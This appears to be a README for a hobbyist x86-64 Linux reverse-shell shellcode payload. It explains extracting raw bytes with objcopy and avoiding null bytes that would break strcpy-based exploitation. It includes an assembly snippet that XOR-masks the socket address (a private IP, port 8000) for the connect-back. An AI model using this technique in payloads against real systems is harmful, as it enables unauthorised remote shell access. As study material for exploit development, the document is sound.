### 64-Bit Linux Reverse Shell Payload (x86-64 Assembly)

This program generates a shellcode payload designed to execute `/bin/sh` on a target vulnerable software that runs on a Linux system. Using a `hexdump` you will notice the usefull section .text is free of nil bytes.

#### Compilation and Payload Extraction
You can compile the source file using the provided `makefile`. To extract the raw section .text bytes, strip the file metadata and elf64 segments using `objcopy`:

```bash
objcopy -O binary --only-section=.text ./<binary_name> <output_payload>
```

## Network Configuration & Null-Byte Avoidance

In the `connect` syscall, the `sockaddr_in` structure requires the Address Family (`AF_INET`), which is mathematically represented as the number `2`. Because x86-64 uses little-endian byte ordering and expects a 16-bit field for this value, the compiler translates it into the raw bytes `02 00`. 

These consecutive null bytes (`00`) will cause string-based functions (like `strcpy`) in a target vulnerable application to terminate, corrupting the payload.

### The XOR Mask Solution

To bypass this restriction while keeping the shellcode fully functional, an **XOR Masking** technique is applied to the network configuration block. Instead of hardcoding the literal structure containing nulls, the payload uses a bitwise logical `XOR` operation entirely within the CPU registers at runtime.

```assembly
;Example of an IP PORT and Address family Bytes.
;NOTE: THIS BIT OPERATION IS TAKEN BY AI WORKS ONLY FOR THE SPECIFIC IP AND PORT THAT THE BYTES DEMONSTRATE
mov rbx, 0xDE10B9D1510E1113   ; Target configuration XORed with the mask
mov rcx, 0x1111111111111111   ; The mask (completely null-free)
xor rbx, rcx                  ; rbx restores exactly to 0xCF01A8C0401F0002!
push rbx                      ; Push the perfectly constructed struct to the stack
```

### THIS FOR EDUCATIONAL PURPOSES ONLY:
Iam doing this the old way and trying not use AI for the code, I only to use it in order to understand things that I may miss as knowledge to achieve this. WHY ??!!! Because It's fun and I can !!!!